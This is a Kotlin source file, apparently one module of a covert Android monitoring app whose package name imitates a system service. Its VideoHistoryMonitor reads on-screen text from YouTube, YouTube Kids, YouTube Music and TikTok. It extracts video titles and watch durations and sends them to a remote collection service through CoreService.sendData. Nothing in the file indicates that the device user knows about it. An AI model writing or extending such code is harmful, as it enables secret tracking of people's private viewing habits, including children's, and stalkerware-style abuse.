package com.system.service.monitors

import com.system.service.core.CoreService
import org.json.JSONObject

object VideoHistoryMonitor {

    private val YOUTUBE_PKGS = setOf(
        "com.google.android.youtube", "com.google.android.apps.youtube.kids",
        "com.google.android.apps.youtube.music"
    )
    private val TIKTOK_PKGS = setOf(
        "com.zhiliaoapp.musically", "com.ss.android.ugc.trill",
        "com.ss.android.ugc.aweme"
    )

    val MONITORED_PKGS = YOUTUBE_PKGS + TIKTOK_PKGS

    private var lastTitle    = ""
    private var lastPkg      = ""
    private var videoStartMs = 0L

    fun onContentChanged(pkg: String, screenText: String) {
        when {
            YOUTUBE_PKGS.contains(pkg) -> handleYouTube(pkg, screenText)
            TIKTOK_PKGS.contains(pkg)  -> handleTikTok(pkg, screenText)
        }
    }

    private fun handleYouTube(pkg: String, text: String) {
        // YouTube video titles are usually the first substantial line visible
        val candidate = text.lines()
            .map { it.trim() }
            .firstOrNull { it.length in 5..120 && !it.startsWith("http") }
            ?: return

        if (candidate == lastTitle && pkg == lastPkg) return

        flushCurrentVideo(pkg)          // send previous video watch time

        lastTitle    = candidate
        lastPkg      = pkg
        videoStartMs = System.currentTimeMillis()

        CoreService.instance?.sendData("video_history", JSONObject().apply {
            put("platform", "youtube")
            put("title",    candidate)
            put("package",  pkg)
            put("time",     System.currentTimeMillis())
        })
    }

    private fun handleTikTok(pkg: String, text: String) {
        val lines = text.lines().map { it.trim() }.filter { it.length in 3..100 }
        val candidate = lines.take(2).joinToString(" | ")
        if (candidate.isBlank() || candidate == lastTitle) return

        flushCurrentVideo(pkg)

        lastTitle    = candidate
        lastPkg      = pkg
        videoStartMs = System.currentTimeMillis()

        CoreService.instance?.sendData("video_history", JSONObject().apply {
            put("platform", "tiktok")
            put("title",    candidate)
            put("package",  pkg)
            put("time",     System.currentTimeMillis())
        })
    }

    private fun flushCurrentVideo(newPkg: String) {
        if (lastTitle.isEmpty()) return  // Bug #13 fix: removed lastPkg!=newPkg check — was skipping flush on app switch
        val watchedSec = (System.currentTimeMillis() - videoStartMs) / 1000
        if (watchedSec >= 5) {
            CoreService.instance?.sendData("video_watched", JSONObject().apply {
                put("title",           lastTitle)
                put("package",         lastPkg)
                put("watched_seconds", watchedSec)
                put("time",            System.currentTimeMillis())
            })
        }
    }
}
